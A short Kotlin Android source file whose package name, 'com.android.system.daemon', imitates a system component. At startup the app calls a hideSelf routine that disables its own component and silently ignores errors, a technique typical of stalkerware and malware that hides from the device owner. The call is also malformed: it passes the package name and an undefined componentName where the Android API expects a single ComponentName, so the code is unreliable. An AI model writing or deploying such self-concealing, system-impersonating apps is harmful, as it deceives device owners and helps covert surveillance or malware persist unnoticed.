package com.android.system.daemon

import android.app.Application
import android.content.pm.PackageManager

class AppContext : Application() {
    override fun onCreate() {
        super.onCreate()
        hideSelf()
    }

    private fun hideSelf() {
        try {
            packageManager.setComponentEnabledSetting(
                packageName,
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }
}
